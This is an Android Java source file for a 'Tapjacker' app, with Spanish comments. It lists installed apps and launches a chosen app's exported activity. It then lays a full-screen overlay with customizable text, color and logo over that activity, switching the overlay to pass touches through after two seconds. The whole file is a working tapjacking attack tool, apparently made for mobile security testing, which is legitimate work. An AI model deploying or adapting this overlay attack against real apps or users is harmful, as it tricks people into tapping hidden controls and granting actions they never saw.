package com.dsavitski.tapjacker;

import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.text.Editable;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.List;

import petrov.kristiyan.colorpicker.ColorPicker;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_OVERLAY_PERMISSION = 1000;

    private EditText delayField;
    private EditText editExportedActivity;
    private EditText editCustomText;
    private Spinner packagesDropDown;
    private Button buttonColorPicker;
    private CheckBox checkboxShowLogo;
    private String[] packagesArr;

    // Variables para el overlay real
    private WindowManager windowManager;
    private View overlayView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        delayField = findViewById(R.id.delayField);
        packagesDropDown = findViewById(R.id.packagesDropDown);
        buttonColorPicker = findViewById(R.id.buttonColorPicker);
        editExportedActivity = findViewById(R.id.editExportedActivity);
        editCustomText = findViewById(R.id.editCustomText);
        checkboxShowLogo = findViewById(R.id.checkboxShowLogo);

        configureDropDown();
        loadPackages();

        // Inicializar WindowManager
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    private void configureDropDown() {
        packagesDropDown.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                final String currentPackage = packagesArr[position];

                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(currentPackage);
                if (launchIntent == null || launchIntent.getComponent() == null) {
                    setStartActivity("");
                    return;
                }

                String activityName = launchIntent.getComponent().getClassName();
                setStartActivity(activityName);
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
                setStartActivity("");
            }
        });
    }

    private void setStartActivity(String name) {
        editExportedActivity.setText(name);
    }

    public void runTapJacker(View view) {
        // Verificar permisos de overlay primero
        if (!checkOverlayPermission()) {
            requestOverlayPermission();
            return;
        }

        // Validar que el campo de delay no esté vacío
        String delayText = delayField.getText().toString().trim();
        if (TextUtils.isEmpty(delayText)) {
            Toast.makeText(getApplicationContext(), "Please enter a delay value", Toast.LENGTH_SHORT).show();
            return;
        }

        final int delay;
        try {
            delay = Integer.parseInt(delayText);
        } catch (NumberFormatException e) {
            Toast.makeText(getApplicationContext(), "Please enter a valid number for delay", Toast.LENGTH_SHORT).show();
            return;
        }

        final String packageName = packagesDropDown.getSelectedItem().toString();
        final String exportedActivityName = editExportedActivity.getText().toString();

        if (delay <= 3) {
            Toast.makeText(getApplicationContext(), "Delay should be 3 or more seconds", Toast.LENGTH_SHORT).show();
            return;
        }

        if (!exportedActivityIsValid(packageName, exportedActivityName)) {
            return;
        }

        // Crear y mostrar overlay real
        createRealOverlay(delay);
        launchExportedActivity(packageName, exportedActivityName);
    }

    private boolean checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(this);
        }
        return true; // Para versiones anteriores a Android 6.0
    }

    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQUEST_OVERLAY_PERMISSION);
            Toast.makeText(this, "Por favor, otorga permisos de overlay para continuar", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_OVERLAY_PERMISSION) {
            if (checkOverlayPermission()) {
                Toast.makeText(this, "Permisos otorgados. Intenta de nuevo.", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Permisos necesarios para el tapjacking", Toast.LENGTH_SHORT).show();
            }
        }
    }

//    private void createRealOverlay(final int delay) {
//        try {
//            // Inflar el layout del overlay
//            LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
//            overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);
//
//            // Configurar parámetros del overlay
//            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
//                    WindowManager.LayoutParams.MATCH_PARENT,
//                    WindowManager.LayoutParams.MATCH_PARENT,
//                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
//                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
//                            WindowManager.LayoutParams.TYPE_PHONE,
//                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
//                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
//                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
//                    PixelFormat.TRANSLUCENT
//            );
//
//            params.gravity = Gravity.TOP | Gravity.LEFT;
//            params.x = 0;
//            params.y = 0;
//
//            // Configurar elementos del overlay
//            configureOverlayElements(overlayView);
//
//            // Mostrar overlay
//            windowManager.addView(overlayView, params);
//            Log.d("TAPJACKER", "Overlay mostrado correctamente");
//
//            // Programar la eliminación del overlay
//            Handler handler = new Handler();
//            handler.postDelayed(new Runnable() {
//                @Override
//                public void run() {
//                    removeOverlay();
//                }
//            }, delay * 1000);
//
//        } catch (Exception e) {
//            Log.e("TAPJACKER", "Error creando overlay: " + e.getMessage());
//            Toast.makeText(this, "Error creando overlay: " + e.getMessage(), Toast.LENGTH_SHORT).show();
//        }
//    }

    private void createRealOverlay(final int delay) {
        try {
            LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
            overlayView = inflater.inflate(R.layout.tapjacker_overlay, null);

            // OPCIÓN 1: Overlay que permite algunos clicks
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                            WindowManager.LayoutParams.TYPE_PHONE,
                    // Flags que permiten que algunos toques pasen
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
            );

            // OPCIÓN 2: Hacer overlay semi-transparente después de 2 segundos
            params.gravity = Gravity.TOP | Gravity.LEFT;
            params.x = 0;
            params.y = 0;

            configureOverlayElements(overlayView);
            windowManager.addView(overlayView, params);

            // Hacer el overlay "clickeable" después de 2 segundos
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    makeOverlayClickThrough();
                }
            }, 2000); // 2 segundos

            // Remover completamente después del delay total
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    removeOverlay();
                }
            }, delay * 1000);

        } catch (Exception e) {
            Log.e("TAPJACKER", "Error creando overlay: " + e.getMessage());
        }
    }

    // Nuevo método para hacer el overlay "transparente" a los clicks
    private void makeOverlayClickThrough() {
        if (overlayView != null && windowManager != null) {
            try {
                // Actualizar parámetros del overlay para permitir clicks
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                                WindowManager.LayoutParams.TYPE_PHONE,
                        // Flags que permiten que TODOS los toques pasen
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                );

                params.gravity = Gravity.TOP | Gravity.LEFT;
                params.x = 0;
                params.y = 0;

                // Actualizar el overlay con los nuevos parámetros
                windowManager.updateViewLayout(overlayView, params);
                Log.d("TAPJACKER", "Overlay ahora permite clicks");

            } catch (Exception e) {
                Log.e("TAPJACKER", "Error actualizando overlay: " + e.getMessage());
            }
        }
    }

    private void removeOverlay() {
        try {
            if (windowManager != null && overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
                Log.d("TAPJACKER", "Overlay removido correctamente");

                // Volver a la actividad principal
                Intent intent = new Intent(MainActivity.this, MainActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e("TAPJACKER", "Error removiendo overlay: " + e.getMessage());
        }
    }

    void launchExportedActivity(final String packageName, final String exportedActivityName) {
        Thread t = new Thread() {
            public void run() {
                try {
                    sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                Log.d("TAPJACKER", "Intentando abrir: " + packageName + "/" + exportedActivityName);

                try {
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName(packageName, exportedActivityName));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Log.d("TAPJACKER", "Actividad abierta exitosamente");
                } catch (ActivityNotFoundException e) {
                    Log.e("TAPJACKER", "Actividad no encontrada, usando launcher principal");
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            launchMainActivity(packageName);
                        }
                    });
                } catch (Exception e) {
                    Log.e("TAPJACKER", "Error al abrir actividad: " + e.getMessage());
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            Toast.makeText(MainActivity.this, "Error al abrir la aplicación: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
                }
            }
        };
        t.start();
    }

    private void launchMainActivity(String packageName) {
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            try {
                launchIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                Log.d("TAPJACKER", "Aplicación principal abierta como fallback");
            } catch (ActivityNotFoundException e) {
                Toast.makeText(this, "No se puede abrir la aplicación", Toast.LENGTH_SHORT).show();
                Log.e("TAPJACKER", "No se puede abrir la aplicación principal");
            }
        } else {
            Toast.makeText(this, "Aplicación no encontrada", Toast.LENGTH_SHORT).show();
            Log.e("TAPJACKER", "Intent de launcher no encontrado para: " + packageName);
        }
    }

    private boolean exportedActivityIsValid(String packageName, String exportedActivityName) {
        if (TextUtils.isEmpty(packageName)) {
            Toast.makeText(getApplicationContext(), "Select package first", Toast.LENGTH_SHORT).show();
            return false;
        }

        if (TextUtils.isEmpty(exportedActivityName)) {
            Toast.makeText(getApplicationContext(), "Set exported activity to launch", Toast.LENGTH_SHORT).show();
            return false;
        }

        try {
            getPackageManager().getPackageInfo(packageName, 0);
        } catch (PackageManager.NameNotFoundException e) {
            Toast.makeText(getApplicationContext(), "La aplicación no está instalada", Toast.LENGTH_SHORT).show();
            return false;
        }

        return true;
    }

    private void configureOverlayElements(View overlayView) {
        int overlayColor;
        try {
            overlayColor = ((ColorDrawable) buttonColorPicker.getBackground()).getColor();
        } catch (Exception e) {
            overlayColor = Color.GREEN;
        }

        final TextView overlayText = overlayView.findViewById(R.id.overlayText);
        final ImageView overlayImage = overlayView.findViewById(R.id.overlayImage);

        if (overlayText != null) {
            overlayText.setTextColor(overlayColor);

            Editable customText = editCustomText.getText();
            if (!TextUtils.isEmpty(customText)) {
                overlayText.setText(customText);
            }
        }

        if (overlayImage != null) {
            overlayImage.setColorFilter(overlayColor);

            if (!checkboxShowLogo.isChecked()) {
                overlayImage.setVisibility(View.INVISIBLE);
            }
        }
    }

    private void loadPackages() {
        Log.d("DEBUG", "=== INICIANDO CARGA DE PAQUETES ===");

        List<ApplicationInfo> packages = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
        Log.d("DEBUG", "Total de paquetes del sistema: " + packages.size());

        List<String> filtered = filterPackages(packages);
        Log.d("DEBUG", "Paquetes después del filtro: " + filtered.size());

        if (filtered.size() == 0) {
            Log.e("DEBUG", "❌ NO SE ENCONTRARON APPS - Revisando permisos...");
            Toast.makeText(this, "No se encontraron aplicaciones", Toast.LENGTH_LONG).show();
            return;
        }

        for (int i = 0; i < Math.min(5, filtered.size()); i++) {
            Log.d("DEBUG", "App " + (i+1) + ": " + filtered.get(i));
        }

        packagesArr = new String[filtered.size()];
        packagesArr = filtered.toArray(packagesArr);

        ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, packagesArr);
        packagesDropDown.setAdapter(adapter);

        Log.d("DEBUG", "✅ Dropdown configurado con " + packagesArr.length + " apps");
    }

    private List<String> filterPackages(final List<ApplicationInfo> packages) {
        List<String> filtered = new ArrayList<>();
        PackageManager pm = getPackageManager();

        Log.d("FILTER", "=== INICIANDO FILTRO ===");
        Log.d("FILTER", "Total paquetes a analizar: " + packages.size());

        int count = 0;
        for (ApplicationInfo packageInfo : packages) {
            final String packageName = packageInfo.packageName;

            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);

            if (launchIntent != null) {
                if (!packageName.startsWith("com.android.") &&
                        !packageName.startsWith("android") &&
                        !packageName.equals("com.google.android.packageinstaller") &&
                        !packageName.equals("com.google.android.gms")) {

                    filtered.add(packageName);
                    count++;

                    if (count <= 10) {
                        Log.d("FILTER", "AGREGADO " + count + ": " + packageName);
                    }
                }
            }
        }

        Log.d("FILTER", "=== FILTRO COMPLETADO: " + filtered.size() + " apps encontradas ===");

        if (filtered.size() < 5) {
            Log.d("FILTER", "Pocas apps encontradas, usando filtro más amplio...");
            filtered.clear();

            for (ApplicationInfo packageInfo : packages) {
                Intent launchIntent = pm.getLaunchIntentForPackage(packageInfo.packageName);
                if (launchIntent != null) {
                    filtered.add(packageInfo.packageName);
                }
            }
            Log.d("FILTER", "Filtro amplio: " + filtered.size() + " apps");
        }

        return filtered;
    }

    public void pickColor(View view) {
        ColorPicker colorPicker = new ColorPicker(this);
        colorPicker.show();
        colorPicker.setOnChooseColorListener(new ColorPicker.OnChooseColorListener() {
            @Override
            public void onChooseColor(final int position, final int color) {
                buttonColorPicker.setBackgroundColor(color);
            }

            @Override
            public void onCancel() {
                // No operation
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Asegurar que el overlay se remueva si la actividad se destruye
        removeOverlay();
    }
}